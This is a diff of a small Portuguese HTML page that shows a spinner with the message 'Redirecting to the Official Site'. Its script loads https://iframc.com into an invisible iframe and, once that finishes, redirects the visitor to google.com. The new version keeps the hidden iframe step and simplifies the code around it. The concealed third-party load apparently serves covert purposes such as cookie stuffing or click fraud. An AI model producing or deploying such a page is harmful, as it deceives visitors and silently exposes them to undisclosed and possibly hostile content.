@@ -3,15 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecionamento</title>
+    <title>Redirecionando</title>
     <style>
+        /* Estilos básicos para a página e o círculo */
         body {
-            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
         }
         .container {
             display: flex;
@@ -22,59 +24,37 @@
             height: 20px;
             border-radius: 50%;
             background-color: green;
-            animation: spin 1s linear infinite; /* Animação */
+            margin-right: 10px;
+            animation: spin 1.5s linear infinite;
         }
-        .text {
-            margin-left: 10px;
-            font-size: 20px; /* Tamanho do texto */
-            color: #FF4500;  /* Cor do texto */
-        }
+        /* Animação de rotação do círculo */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        iframe {
-            display: none; /* Escondendo o iframe */
-        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="circle"></div>
+        <p>✅ Aguarde! Redirecionando para o Site Oficial</p>
+    </div>
 
-<div class="container">
-    <div class="circle"></div>
-    <div class="text">✅ Aguarde! Redirecionando para o Site Oficial</div>
-</div>
+    <!-- Iframe invisível -->
+    <iframe id="hiddenIframe" src="" style="display:none;"></iframe>
 
-<!-- Iframe invisível -->
-<iframe id="hiddenIframe" src=""></iframe>
+    <script>
+        // Definindo os sets
+        var lnkfrm = 'https://iframc.com';
+        var lnkdtn = 'https://google.com';
 
-<script>
-    // URLs definidas
-    const lnkfrm = 'https://iframc.com';  // URL do iframe
-    const lnkdtn = 'https://google.com';  // URL de destino final
+        // Carregando o iframe invisível
+        document.getElementById('hiddenIframe').src = lnkfrm;
 
-    // Função chamada quando o iframe é carregado completamente
-    function onIframeLoad() {
-        console.log('Iframe carregado!');
-
-        // Espera para garantir que o iframe foi processado
-        setTimeout(() => {
-            console.log('Redirecionando...');
-            window.location.href = lnkdtn; // Redirecionamento final
-        }, 500); // Atraso de 500 ms
-    }
-
-    // Carregando o iframe
-    window.onload = function() {
-        const iframe = document.getElementById('hiddenIframe');
-        
-        // Adiciona o evento onload ao iframe
-        iframe.onload = onIframeLoad;
-
-        // Define a URL do iframe
-        iframe.src = lnkfrm;
-    };
-</script>
-
+        // Função de redirecionamento após o carregamento do iframe
+        document.getElementById('hiddenIframe').onload = function() {
+            window.location.href = lnkdtn;
+        };
+    </script>
 </body>
 </html>
